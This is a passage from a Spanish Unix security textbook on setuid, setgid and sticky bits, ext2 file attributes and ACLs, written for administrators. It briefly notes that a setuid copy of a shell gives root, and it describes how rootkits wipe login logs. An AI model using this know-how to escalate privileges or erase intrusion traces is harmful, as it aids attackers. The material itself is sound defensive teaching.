<!--l. 456--><para>Esta forma de trabajo simb&#x00F3;lica es menos utilizada en la pr&#x00E1;ctica que la forma octal, pero en ciertas
situaciones es muy &#x00FA;til, por ejemplo si deseamos activar todos los permisos de ejecuci&#x00F3;n de un archivo o si
queremos setuidarlo: un simple chmod +x o chmod u+s es su&#xFB01;ciente en estos casos, y evitamos
preocuparnos por si modi&#xFB01;camos el resto de permisos.
<!--br/-->
<!--br/-->Quiz&#x00E1;s despu&#x00E9;s de ver el procedimiento de modi&#xFB01;caci&#x00F3;n de los permisos de un &#xFB01;chero, este puede parecer
demasiado complicado y arcaico para un sistema operativo moderno; a &#xFB01;n de cuentas, mucha gente
pre&#xFB01;ere gestores gr&#x00E1;&#xFB01;cos de permisos &#x2013; igual que pre&#xFB01;ere gestores gr&#x00E1;&#xFB01;cos para otras tareas de
administraci&#x00F3;n &#x2013;, programas que dan todo hecho y no obligan al administrador a &#x2018;complicarse&#x2019;,
llenos de men&#x00FA;s desplegables y di&#x00E1;logos que una y otra vez preguntan si realmente deseamos
modi&#xFB01;car cierto permiso (&#x00BF;Est&#x00E1; usted seguro? &#x00BF;Realmente seguro? &#x00BF;Es mayor de edad? &#x00BF;Me lo
jura?). Incluso esas personas aseguran que el procedimiento gr&#x00E1;&#xFB01;co es mucho m&#x00E1;s claro y m&#x00E1;s
potente que el que Unix ofrece en modo texto. Nada m&#x00E1;s lejos de la realidad; por un lado,
aunque todo el mundo reconoce que la explicaci&#x00F3;n detallada de c&#x00F3;mo funcionan los permisos de
&#xFB01;cheros es algo farragosa, en la pr&#x00E1;ctica el convertir una terna de bits rwx a octal o viceversa es
una tarea trivial, algo que ning&#x00FA;n administrador con unas cuantas horas de pr&#x00E1;ctica ni siquiera
necesita pensar. Por otro, algo m&#x00E1;s importante que la facilidad o di&#xFB01;cultad de modi&#xFB01;car los
permisos: su robustez; hemos de pensar que este modelo de protecci&#x00F3;n est&#x00E1; vigente desde hace
casi treinta a~nos y no ha cambiado absolutamente nada. Si en todo este tiempo no se ha
modi&#xFB01;cado el mecanismo, obviamente es porque siempre ha funcionado &#x2013; y lo sigue haciendo &#x2013;
bien.
  </para></section><!--end section--><!--l. 483--><section 
role="section"><title><abbrev role="title-mark">4.4</abbrev><anchor 
   id="x1-560004.4"  ></anchor>Los bits SUID, SGID y sticky</title>
<!--l. 484--><para>  Habitualmente, los permisos de los archivos en Unix se corresponden con un n&#x00FA;mero en octal
que var&#x02CA;&#x0131;a entre 000 y 777; sin embargo, existen unos permisos especiales que hacen variar
ese n&#x00FA;mero entre 0000 y 7777: se trata de los bits de permanencia (1000), SGID (2000) y SUID
(4000).
<!--br/-->
<!--br/-->El bit de SUID o setuid se activa sobre un &#xFB01;chero a~nadi&#x00E9;ndole 4000 a la representaci&#x00F3;n octal de los permisos
del archivo y otorg&#x00E1;ndole adem&#x00E1;s permiso de ejecuci&#x00F3;n al propietario del mismo; al hacer esto, en lugar de la
x en la primera terna de los permisos, aparecer&#x00E1; una s o una S si no hemos otorgado el permiso de ejecuci&#x00F3;n
correspondiente (en este caso el bit no tiene efecto):

     </para><literallayout role="verbatim">
&#x00A0;anita:~#&#x00A0;chmod&#x00A0;4777&#x00A0;/tmp/file1
&#x00A0;anita:~#&#x00A0;chmod&#x00A0;4444&#x00A0;/tmp/file2
&#x00A0;anita:~#&#x00A0;ls&#x00A0;-l&#x00A0;/tmp/file1
&#x00A0;-rwsrwxrwx&#x00A0;&#x00A0;&#x00A0;1&#x00A0;root&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;other&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;Feb&#x00A0;&#x00A0;9&#x00A0;17:51&#x00A0;/tmp/file1*
&#x00A0;anita:~#&#x00A0;ls&#x00A0;-l&#x00A0;/tmp/file2
&#x00A0;-r-Sr--r--&#x00A0;&#x00A0;&#x00A0;1&#x00A0;root&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;other&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;Feb&#x00A0;&#x00A0;9&#x00A0;17:51&#x00A0;/tmp/file2*
&#x00A0;anita:~#
</literallayout>
<!--l. 506--><para>El bit SUID activado sobre un &#xFB01;chero indica que todo aqu&#x00E9;l que ejecute el archivo va a tener durante
la ejecuci&#x00F3;n los mismos privilegios que qui&#x00E9;n lo cre&#x00F3;; dicho de otra forma, si el administrador
crea un &#xFB01;chero y lo setuida, todo aquel usuario que lo ejecute va a disponer, hasta que el
programa &#xFB01;nalice, de un nivel de privilegio total en el sistema. Podemos verlo con el siguiente
ejemplo:

     </para><literallayout role="verbatim">
&#x00A0;luisa:/home/toni#&#x00A0;cat&#x00A0;testsuid.c
&#x00A0;#include&#x00A0;&#x003C;stdio.h&#x003E;
&#x00A0;#include&#x00A0;&#x003C;unistd.h&#x003E;
&#x00A0;
&#x00A0;main(){
&#x00A0;&#x00A0;&#x00A0;printf(&#x0022;UID:&#x00A0;%d,&#x00A0;EUID:&#x00A0;%d&#x005C;n&#x0022;,getuid(),geteuid());
&#x00A0;}
&#x00A0;luisa:/home/toni#&#x00A0;cc&#x00A0;-o&#x00A0;testsuid&#x00A0;testsuid.c
&#x00A0;luisa:/home/toni#&#x00A0;chmod&#x00A0;u+s&#x00A0;testsuid
&#x00A0;luisa:/home/toni#&#x00A0;ls&#x00A0;-l&#x00A0;testsuid
&#x00A0;-rwsr-xr-x&#x00A0;&#x00A0;&#x00A0;1&#x00A0;root&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;root&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;4305&#x00A0;Feb&#x00A0;10&#x00A0;02:34&#x00A0;testsuid
&#x00A0;luisa:/home/toni#&#x00A0;su&#x00A0;toni
&#x00A0;luisa:~$&#x00A0;id
&#x00A0;uid=1000(toni)&#x00A0;gid=100(users)&#x00A0;groups=100(users)
&#x00A0;luisa:~$&#x00A0;./testsuid
&#x00A0;UID:&#x00A0;1000,&#x00A0;EUID:&#x00A0;0
&#x00A0;luisa:~$
</literallayout>
<!--l. 533--><para>Podemos comprobar que el usuario toni, sin ning&#x00FA;n privilegio especial en el sistema, cuando ejecuta nuestro
programa setuidado de prueba est&#x00E1; trabajando con un EUID (E&#xFB00;ective UID) 0, lo que le otorga todo el
poder del administrador (&#xFB01;j&#x00E9;monos que &#x00E9;ste &#x00FA;ltimo es el propietario del ejecutable); si en lugar de este
c&#x00F3;digo el ejecutable fuera una copia de un shell, el usuario toni tendr&#x02CA;&#x0131;a todos los privilegios
del root mientras no &#xFB01;nalice la ejecuci&#x00F3;n, es decir, hasta que no se teclee exit en la l&#x02CA;&#x0131;nea de
&#x00F3;rdenes.
<!--br/-->
<!--br/-->Todo lo que acabamos de comentar con respecto al bit setuid es aplicable al bit setgid pero a nivel de
grupo del &#xFB01;chero en lugar de propietario: en lugar de trabajar con el EUID del propietario, todo usuario
que ejecute un programa setgidado tendr&#x00E1; los privilegios del grupo al que pertenece el archivo. Para
activar el bit de setgid sumaremos 2000 a la representaci&#x00F3;n octal del permiso del &#xFB01;chero y adem&#x00E1;s
habremos de darle permiso de ejecuci&#x00F3;n a la terna de grupo; si lo hacemos, la s o S aparecer&#x00E1; en
lugar de la x en esta terna. Si el &#xFB01;chero es un directorio y no un archivo plano, el bit setgid
afecta a los &#xFB01;cheros y subdirectorios que se creen en &#x00E9;l: estos tendr&#x00E1;n como grupo propietario al
mismo que el directorio setgidado, siempre que el proceso que los cree pertenezca a dicho
grupo.
<!--br/-->
<!--br/-->Pero, &#x00BF;c&#x00F3;mo afecta todo esto a la seguridad del sistema? Muy sencillo: los bits de setuid y setgid dan a Unix
una gran &#xFB02;exibilidad, pero constituyen al mismo tiempo la mayor fuente de ataques internos al sistema
(entendiendo por ataques internos aquellos realizados por un usuario &#x2013; autorizado o no &#x2013; desde la propia
m&#x00E1;quina, generalmente con el objetivo de aumentar su nivel de privilegio en la misma). Cualquier
sistema Unix tiene un cierto n&#x00FA;mero de ejecutables setuidados y/o setgidados. Cada uno de ellos,
como acabamos de comentar, se ejecuta con los privilegios de quien lo cre&#x00F3; (generalmente el
root u otro usuario con ciertos privilegios) lo que directamente implica que cualquier usuario
tiene la capacidad de lanzar tareas que escapen total o parcialmente al control del sistema
operativo: se ejecutan en modo privilegiado si es el administrador quien cre&#x00F3; los ejecutables.
Evidentemente, estas tareas han de estar controladas de una forma exhaustiva, ya que si una de ellas
se comporta de forma anormal (un simple core dump) puede causar da~nos irreparables al
sistema <anchor 
   id="x1-56001f6"  ></anchor><footnote><para>     Es especialmente preocupante la posibilidad de ejecutar c&#x00F3;digo arbitrario (<citation>[?]</citation>), comentada en la secci&#x00F3;n
<ulink 
  url="#x1-680005.3"  ><!--ref: bufover--></ulink>.</para></footnote>;
tanto es as&#x02CA;&#x0131; que hay innumerables documentos que de&#xFB01;nen, o lo intentan, pautas de programaci&#x00F3;n
considerada &#x2018;segura&#x2019; (en la secci&#x00F3;n  <ulink 
  url="#x1-820005.5"  ><!--ref: progseg--></ulink> se citan algunos de ellos y tambi&#x00E9;n se explican algunas de estas t&#x00E9;cnicas).
Si por cualquier motivo un programa setuidado falla se asume inmediatamente que presenta
un problema de seguridad para la m&#x00E1;quina, y se recomienda resetear el bit de setuid cuanto
antes.

<!--br/-->
<!--br/-->Est&#x00E1; claro que asegurar completamente el comportamiento correcto de un programa es muy dif&#x02CA;&#x0131;cil, por no
decir imposible; cada cierto tiempo suelen aparecer fallos (bugs) en &#xFB01;cheros setuidados de los diferentes
clones de Unix que ponen en peligro la integridad del sistema. Entonces, &#x00BF;por qu&#x00E9; no se adopta una soluci&#x00F3;n
radical, como eliminar este tipo de archivos? Hay una sencilla raz&#x00F3;n: el riesgo que presentan no se
corre in&#x00FA;tilmente, para tentar al azar, sino que los archivos que se ejecutan con privilegios son
estrictamente necesarios en Unix, al menos algunos de ellos. Veamos un ejemplo: un &#xFB01;chero setuidado
cl&#x00E1;sico en cualquier clon es /bin/passwd, la orden para que los usuarios puedan cambiar su
contrase~na de entrada al sistema. No hace falta analizar con mucho detalle el funcionamiento de
este programa para darse cuenta que una de sus funciones consiste en modi&#xFB01;car el &#xFB01;chero de
claves (/etc/passwd o /etc/shadow). Est&#x00E1; claro que un usuario per se no tiene el nivel de
privilegio necesario para hacer esto (incluso es posible que ni siquiera pueda leer el &#xFB01;chero de
claves), por lo que frente a este problema tan simple existen varias soluciones: podemos asignar
permiso de escritura para todo el mundo al &#xFB01;chero de contrase~nas, podemos denegar a los
usuarios el cambio de clave o podemos obligarles a pasar por la sala de operaciones cada vez
que quieran cambiar su contrase~na. Parece obvio que ninguna de ellas es apropiada para la
seguridad del sistema (quiz&#x00E1;s la &#x00FA;ltima lo sea, pero es impracticable en m&#x00E1;quinas con un n&#x00FA;mero de
usuarios considerable). Por tanto, debemos asumir que el bit de setuid en /bin/passwd es
imprescindible para un correcto funcionamiento del sistema. Sin embargo, esto no siempre sucede as&#x02CA;&#x0131;:
en un sistema Unix instalado out of the box el n&#x00FA;mero de &#xFB01;cheros setuidados suele ser mayor
de cincuenta; sin perjudicar al correcto funcionamiento de la m&#x00E1;quina, este n&#x00FA;mero se puede
reducir a menos de cinco, lo que viene a indicar que una de las tareas de un administrador
sobre un sistema reci&#x00E9;n instalado es minimizar el n&#x00FA;mero de &#xFB01;cheros setuidados o setgidados. No
obstante, tampoco es conveniente eliminarlos, sino simplemente resetear su bit de setuid mediante
chmod:

     </para><literallayout role="verbatim">
&#x00A0;luisa:~#&#x00A0;ls&#x00A0;-l&#x00A0;/bin/ping
&#x00A0;-r-sr-xr-x&#x00A0;&#x00A0;&#x00A0;1&#x00A0;root&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;bin&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;14064&#x00A0;May&#x00A0;10&#x00A0;&#x00A0;1999&#x00A0;/bin/ping*
&#x00A0;luisa:~#&#x00A0;chmod&#x00A0;-s&#x00A0;/bin/ping
&#x00A0;luisa:~#&#x00A0;ls&#x00A0;-l&#x00A0;/bin/ping
&#x00A0;-r-xr-xr-x&#x00A0;&#x00A0;&#x00A0;1&#x00A0;root&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;bin&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;14064&#x00A0;May&#x00A0;10&#x00A0;&#x00A0;1999&#x00A0;/bin/ping*
&#x00A0;luisa:~#
</literallayout>
<!--l. 618--><para>Tambi&#x00E9;n hemos de estar atentos a nuevos &#xFB01;cheros de estas caracter&#x02CA;&#x0131;sticas que se localicen en la m&#x00E1;quina;
demasiadas aplicaciones de Unix se instalan por defecto con ejecutables setuidados cuando realmente este
bit no es necesario, por lo que a la hora de instalar nuevo software o actualizar el existente hemos de
acordarnos de resetear el bit de los &#xFB01;cheros que no lo necesiten. Especialmente grave es la aparici&#x00F3;n de
archivos setuidados de los que el administrador no ten&#x02CA;&#x0131;a constancia (ni son aplicaciones del sistema ni un
aplicaciones a~nadidas), ya que esto casi en el 100 % de los casos indica que nuestra m&#x00E1;quina ha sido
comprometida por un atacante. Para localizar los &#xFB01;cheros con alguno de estos bits activos, podemos
ejecutar la siguiente orden:

     </para><literallayout role="verbatim">
&#x00A0;luisa:~#&#x00A0;find&#x00A0;/&#x00A0;&#x005C;(&#x00A0;-perm&#x00A0;-4000&#x00A0;-o&#x00A0;-perm&#x00A0;-2000&#x00A0;&#x005C;)&#x00A0;-type&#x00A0;f&#x00A0;-print
</literallayout>
<!--l. 634--><para>Por otra parte, el sticky bit o bit de permanencia se activa sum&#x00E1;ndole 1000 a la representaci&#x00F3;n octal de los
permisos de un determinado archivo y otorg&#x00E1;ndole adem&#x00E1;s permiso de ejecuci&#x00F3;n; si hacemos esto, veremos que
en lugar de una x en la terna correspondiente al resto de usuarios aparece una t (si no le hemos dado
permiso de ejecuci&#x00F3;n al archivo, aparecer&#x00E1; una T):

     </para><literallayout role="verbatim">
&#x00A0;anita:~#&#x00A0;chmod&#x00A0;1777&#x00A0;/tmp/file1
&#x00A0;anita:~#&#x00A0;chmod&#x00A0;1774&#x00A0;/tmp/file2
&#x00A0;anita:~#&#x00A0;ls&#x00A0;-l&#x00A0;/tmp/file1
&#x00A0;-rwxrwxrwt&#x00A0;&#x00A0;&#x00A0;1&#x00A0;root&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;other&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;Feb&#x00A0;&#x00A0;9&#x00A0;17:51&#x00A0;/tmp/file1*
&#x00A0;anita:~#&#x00A0;ls&#x00A0;-l&#x00A0;/tmp/file2
&#x00A0;-rwxrwxr-T&#x00A0;&#x00A0;&#x00A0;1&#x00A0;root&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;other&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;Feb&#x00A0;&#x00A0;9&#x00A0;17:51&#x00A0;/tmp/file2*
&#x00A0;anita:~#
</literallayout>
<!--l. 652--><para>Si el bit de permanencia de un &#xFB01;chero est&#x00E1; activado (recordemos que si aparece una T no lo est&#x00E1;) le
estamos indicando al sistema operativo que se trata de un archivo muy utilizado, por lo que es
conveniente que permanezca en memoria principal el mayor tiempo posible; esta opci&#x00F3;n se utilizaba
en sistemas antiguos que dispon&#x02CA;&#x0131;an de muy poca RAM, pero hoy en d&#x02CA;&#x0131;a pr&#x00E1;cticamente no se
utiliza. Lo que si que sigue vigente es el efecto del sticky bit activado sobre un directorio:
en este caso se indica al sistema operativo que, aunque los permisos &#x2018;normales&#x2019; digan que
cualquier usuario pueda crear y eliminar &#xFB01;cheros (por ejemplo, un 777 octal), s&#x00F3;lo el propietario de
cierto archivo y el administrador pueden borrar un archivo guardado en un directorio con estas
caracter&#x02CA;&#x0131;sticas. Este bit, que s&#x00F3;lo tiene efecto cuando es activado por el administrador (aunque
cualquier usuario puede hacer que aparezca una t o una T en sus &#xFB01;cheros y directorios), se utiliza
principalmente en directorios del sistema de &#xFB01;cheros en los que interesa que todos puedan
escribir pero que no todos puedan borrar los datos escritos, como /tmp/ o /var/tmp/: si el
equivalente octal de los permisos de estos directorios fuera simplemente 777 en lugar de 1777,
cualquier usuario podr&#x02CA;&#x0131;a borrar los &#xFB01;cheros del resto. Si pensamos que para evitar problemas
podemos simplemente denegar la escritura en directorios como los anteriores tambi&#x00E9;n estamos
equivocados: muchos programas &#x2013; como compiladores, editores o gestores de correo &#x2013; asumen
que van a poder crear &#xFB01;cheros en /tmp/ o /var/tmp/, de forma que si no se permite a los
usuarios hacerlo no van a funcionar correctamente; por tanto, es muy recomendable para el
buen funcionamiento del sistema que al menos el directorio /tmp/ tenga el bit de permanencia
activado.
<!--br/-->
<!--br/-->Ya para &#xFB01;nalizar, volvemos a lo que hemos comentado al principio de la secci&#x00F3;n: el equivalente octal de los
permisos en Unix puede variar entre 0000 y 7777. Hemos visto que pod&#x02CA;&#x0131;amos sumar 4000, 2000 o 1000
a los permisos &#x2018;normales&#x2019; para activar respectivamente los bits setuid, setgid o sticky. Por
supuesto, podemos activar varios de ellos a la vez simplemente sumando sus valores: en la situaci&#x00F3;n
poco probable de que necesit&#x00E1;ramos todos los bits activos, sumar&#x02CA;&#x0131;amos 7000 a la terna octal
777:

     </para><literallayout role="verbatim">
&#x00A0;luisa:~#&#x00A0;chmod&#x00A0;0&#x00A0;/tmp/fichero
&#x00A0;luisa:~#&#x00A0;ls&#x00A0;-l&#x00A0;/tmp/fichero
&#x00A0;----------&#x00A0;&#x00A0;&#x00A0;1&#x00A0;root&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;root&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;Feb&#x00A0;&#x00A0;9&#x00A0;05:05&#x00A0;/tmp/fichero
&#x00A0;luisa:~#&#x00A0;chmod&#x00A0;7777&#x00A0;/tmp/fichero
&#x00A0;luisa:~#&#x00A0;ls&#x00A0;-l&#x00A0;/tmp/fichero
&#x00A0;-rwsrwsrwt&#x00A0;&#x00A0;&#x00A0;1&#x00A0;root&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;root&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;Feb&#x00A0;&#x00A0;9&#x00A0;05:05&#x00A0;/tmp/fichero*
&#x00A0;luisa:~#
</literallayout>
<!--l. 695--><para>Si en lugar de especi&#xFB01;car el valor octal de los permisos queremos utilizar la forma simb&#x00F3;lica de chmod,
utilizaremos +t para activar el bit de permanencia, g+s para activar el de setgid y u+s para hacer lo mismo
con el de setuid; si queremos resetearlos, utilizamos un signo &#x2018;-&#x2019; en lugar de un &#x2018;+&#x2019; en la l&#x02CA;&#x0131;nea de
&#x00F3;rdenes.
  </para></section><!--end section--><!--l. 700--><section 
role="section"><title><abbrev role="title-mark">4.5</abbrev><anchor 
   id="x1-570004.5"  ></anchor>Atributos de un archivo</title>
<!--l. 701--><para>  En el sistema de &#xFB01;cheros ext2 (Second Extended File System) de Linux existen ciertos atributos para los
&#xFB01;cheros que pueden ayudar a incrementar la seguridad de un sistema. Estos atributos son los mostrados en
la tabla  <ulink 
  url="#x1-570011"  ><!--ref: attr--></ulink>.
<!--br/-->


</para><section role="center"><title/>
<!--l. 706--><para> </para><table ><informaltable><tgroup cols="2"><tbody><row><entry 
 align="center"><para>        Atributo        </para></entry><entry 
 align="center"><para>  Signi&#xFB01;cado   </para></entry>
 </row><row><entry 
 align="center"><para>             A             </para></entry><entry 
 align="center"><para>        Don&#x02CA; </para></entry>
 <entry 
><para>Synchronous updates</para></entry>
 </row><row><entry 
 align="center"><para>             a             </para></entry><entry 
 align="center"><para> Append only  </para></entry>
 </row><row><entry 
 align="center"><para>             c             </para></entry><entry 
 align="center"><para>Compressed &#xFB01;le</para></entry>
 </row><row><entry 
 align="center"><para>              i              </para></entry><entry 
 align="center"><para> Immutable &#xFB01;le </para></entry>
 </row><row><entry 
 align="center"><para>             d             </para></entry><entry 
 align="center"><para>  No Dump    </para></entry>
 </row><row><entry 
 align="center"><para>             s             </para></entry><entry 
 align="center"><para>Secure deletion</para></entry>
 </row><row><entry 
 align="center"><para>             u             </para></entry><entry 
 align="center"><para>Undeletable &#xFB01;le</para></entry>
 </row><row><entry 
 align="center"><para>                            </para></entry>
 </row></tbody></tgroup></informaltable></section>
<blockquote role="caption"><title role="caption"><anchor 
   id="x1-570011"  ></anchor>Cuadro&#x00A0;4.1</title><para>Atributos de los archivos en ext2fs.</para></blockquote>

<!--l. 732--><para>  De todos ellos, de cara a la seguridad algunos no nos interesan demasiado, pero otros s&#x02CA;&#x0131; que se deben
tener en cuenta. Uno de los atributos interesantes &#x2013; quiz&#x00E1;s el que m&#x00E1;s &#x2013; es &#x2018;a&#x2019;; tan importante es que s&#x00F3;lo el
administrador tiene el privilegio su&#xFB01;ciente para activarlo o desactivarlo. El atributo &#x2018;a&#x2019; sobre un &#xFB01;chero
indica que este s&#x00F3;lo se puede abrir en modo escritura para a~nadir datos, pero nunca para eliminarlos. &#x00BF;Qu&#x00E9;
tiene que ver esto con la seguridad? Muy sencillo: cuando un intruso ha conseguido el privilegio su&#xFB01;ciente
en un sistema atacado, lo primero que suele hacer es borrar sus huellas; para esto existen muchos
programas (denominados zappers, rootkits&#x2026;) que, junto a otras funciones, eliminan estructuras de ciertos
&#xFB01;cheros de log como lastlog, wtmp o utmp. As&#x02CA;&#x0131; consiguen que cuando alguien ejecute last, who,
users, w o similares, no vea ni rastro de la conexi&#x00F3;n que el atacante ha realizado a la m&#x00E1;quina;
evidentemente, si estos archivos de log poseen el atributo &#x2018;a&#x2019; activado, el pirata y sus programas lo
tienen m&#x00E1;s dif&#x02CA;&#x0131;cil para borrar datos de ellos. Ahora viene la siguiente cuesti&#x00F3;n: si el pirata ha
conseguido el su&#xFB01;ciente nivel de privilegio como para poder escribir &#x2013; borrar &#x2013; en los &#xFB01;cheros
(en la mayor&#x02CA;&#x0131;a de Unices para realizar esta tarea se necesita ser root), simplemente ha de
resetear el atributo &#x2018;a&#x2019; del archivo, eliminar los datos comprometedores y volver a activarlo.
Obviamente, esto es as&#x02CA;&#x0131; de simple, pero siempre hemos de recordar que en las redes habituales no
suelen ser atacadas por piratas con un m&#x02CA;&#x0131;nimo nivel de conocimientos, sino por los intrusos m&#x00E1;s
novatos de la red; tan novatos que generalmente se limitan a ejecutar programas desde sus
&#xFB02;amantes Windows sin tener ni la m&#x00E1;s remota idea de lo que est&#x00E1;n haciendo en Unix, de forma que
una protecci&#x00F3;n tan elemental como un &#xFB01;chero con el &#xFB02;ag &#x2018;a&#x2019; activado se convierte en algo
imposible de modi&#xFB01;car para ellos, con lo que su acceso queda convenientemente registrado en el
sistema.
<!--br/-->
<!--br/-->Otro atributo del sistema de archivos ext2 es &#x2018;i&#x2019; (&#xFB01;chero inmutable); un archivo con este &#xFB02;ag activado no
se puede modi&#xFB01;car de ninguna forma, ni a~nadiendo datos ni borr&#x00E1;ndolos, ni eliminar el archivo, ni tan
siquiera enlazarlo mediante ln. Igual que suced&#x02CA;&#x0131;a antes, s&#x00F3;lo el administrador puede activar o
desactivar el atributo &#x2018;i&#x2019; de un &#xFB01;chero. Podemos aprovechar esta caracter&#x02CA;&#x0131;stica en los archivos que
no se modi&#xFB01;can frecuentemente, por ejemplo muchos de los contenidos en /etc/ (&#xFB01;cheros
de con&#xFB01;guraci&#x00F3;n, scripts de arranque&#x2026;incluso el propio &#xFB01;chero de contrase~nas si el a~nadir o
eliminar usuarios tampoco es frecuente en nuestro sistema); de esta forma conseguimos que ning&#x00FA;n
usuario pueda modi&#xFB01;carlos incluso aunque sus permisos lo permitan. Cuando activemos el
atributo &#x2018;i&#x2019; en un archivo hemos de tener siempre en cuenta que el archivo no va a poder ser
modi&#xFB01;cado por nadie, incluido el administrador, y tampoco por los programas que se ejecutan en la
m&#x00E1;quina; por tanto, si activ&#x00E1;ramos este atributo en un &#xFB01;chero de log, no se grabar&#x02CA;&#x0131;a ninguna
informaci&#x00F3;n en &#x00E9;l, lo que evidentemente no es conveniente. Tambi&#x00E9;n hemos de recordar que
los archivos tampoco van a poder sen enlazados, lo que puede ser problem&#x00E1;tico en algunas
variantes de Linux que utilizan enlaces duros para la con&#xFB01;guraci&#x00F3;n de los &#xFB01;cheros de arranque del
sistema.
<!--br/-->
<!--br/-->Atributos que tambi&#x00E9;n pueden ayudar a implementar una correcta pol&#x02CA;&#x0131;tica de seguridad en la m&#x00E1;quina,
aunque menos importantes que los anteriores, son &#x2018;s&#x2019; y &#x2018;S&#x2019;. Si borramos un archivo con el
atributo &#x2018;s&#x2019; activo, el sistema va a rellenar sus bloques con ceros en lugar de efectuar un simple
unlink(), para as&#x02CA;&#x0131; di&#xFB01;cultar la tarea de un atacante que intente recuperarlo; realmente, para un
pirata experto esto no supone ning&#x00FA;n problema, simplemente un retraso en sus prop&#x00F3;sitos: en el
punto  <ulink 
  url="#x1-590004.7"  ><!--ref: secure-del--></ulink> se trata m&#x00E1;s ampliamente la amenaza de la recuperaci&#x00F3;n de archivos, y tambi&#x00E9;n ah&#x02CA;&#x0131; se
comenta que un simple relleno de bloques mediante bzero() no hace que la informaci&#x00F3;n sea
irrecuperable.
<!--br/-->
<!--br/-->Por su parte, el atributo &#x2018;S&#x2019; sobre un &#xFB01;chero hace que los cambios sobre el archivo se escriban
inmediatamente en el disco en lugar de esperar el sync del sistema operativo. Aunque no es lo habitual,
bajo ciertas circunstancias un &#xFB01;chero de log puede perder informaci&#x00F3;n que a&#x00FA;n no se haya volcado a disco:
imaginemos por ejemplo que alguien conecta al sistema y cuando &#x00E9;ste registra la entrada, la m&#x00E1;quina se
apaga s&#x00FA;bitamente; toda la informaci&#x00F3;n que a&#x00FA;n no se haya grabado en disco se perder&#x00E1;. Aunque como
decimos, esto no suele ser habitual &#x2013; adem&#x00E1;s, ya hemos hablado de las ventajas de instalar un S.A.I. &#x2013;, si
nuestro sistema se apaga frecuentemente s&#x02CA;&#x0131; que nos puede interesar activar el bit &#x2018;S&#x2019; de ciertos &#xFB01;cheros
importantes.
<!--br/-->
<!--br/-->Ya hemos tratado los atributos del sistema de &#xFB01;cheros ext2 que pueden incrementar la seguridad de Linux;

vamos a ver ahora, sin entrar en muchos detalles (recordemos que tenemos a nuestra disposici&#x00F3;n las p&#x00E1;ginas
del manual) c&#x00F3;mo activar o desactivar estos atributos sobre &#xFB01;cheros, y tambi&#x00E9;n c&#x00F3;mo ver su estado. Para lo
primero utilizamos la orden chattr, que recibe como par&#x00E1;metros el nombre del atributo junto a un signo
&#x2018;+&#x2019; o &#x2018;-&#x2019;, en funci&#x00F3;n de si deseamos activar o desactivar el atributo, y tambi&#x00E9;n el nombre de &#xFB01;chero
correspondiente. Si lo que deseamos es visualizar el estado de los diferentes atributos, utilizaremos lsattr,
cuya salida indicar&#x00E1; con la letra correspondiente cada atributo del &#xFB01;chero o un signo - en el caso de que el
atributo no est&#x00E9; activado:

     </para><literallayout role="verbatim">
&#x00A0;luisa:~#&#x00A0;lsattr&#x00A0;/tmp/fichero
&#x00A0;--------&#x00A0;/tmp/fichero
&#x00A0;luisa:~#&#x00A0;chattr&#x00A0;+a&#x00A0;/tmp/fichero
&#x00A0;luisa:~#&#x00A0;chattr&#x00A0;+Ss&#x00A0;/tmp/fichero
&#x00A0;luisa:~#&#x00A0;lsattr&#x00A0;/tmp/fichero
&#x00A0;s--S-a--&#x00A0;/tmp/fichero
&#x00A0;luisa:~#&#x00A0;chattr&#x00A0;-sa&#x00A0;/tmp/fichero
&#x00A0;luisa:~#&#x00A0;lsattr&#x00A0;/tmp/fichero
&#x00A0;---S----&#x00A0;/tmp/fichero
&#x00A0;luisa:~#
</literallayout>
  </section><!--end section--><!--l. 827--><section 
role="section"><title><abbrev role="title-mark">4.6</abbrev><anchor 
   id="x1-580004.6"  ></anchor>Listas de control de acceso: ACLs</title>
<!--l. 828--><para>  Las listas de control de acceso (ACLs, Access Control Lists) proveen de un nivel adicional de seguridad a
los &#xFB01;cheros extendiendo el cl&#x00E1;sico esquema de permisos en Unix: mientras que con estos &#x00FA;ltimos s&#x00F3;lo podemos
especi&#xFB01;car permisos para los tres grupos de usuarios habituales (propietario, grupo y resto), las ACLs van
a permitir asignar permisos a usuarios o grupos concretos; por ejemplo, se pueden otorgar ciertos permisos
a dos usuarios sobre unos &#xFB01;cheros sin necesidad de incluirlos en el mismo grupo. Este mecanismo est&#x00E1;
disponible en la mayor&#x02CA;&#x0131;a de Unices (Solaris, AIX, HP-UX&#x2026;), mientras que en otros que no
lo proporcionan por defecto, como Linux, puede instalarse como un software adicional. A
pesar de las agresivas campa~nas de marketing de alguna empresa, que justamente presum&#x02CA;&#x0131;a
de ofrecer este modelo de protecci&#x00F3;n en sus sistemas operativos frente al &#x2018;arcaico&#x2019; esquema
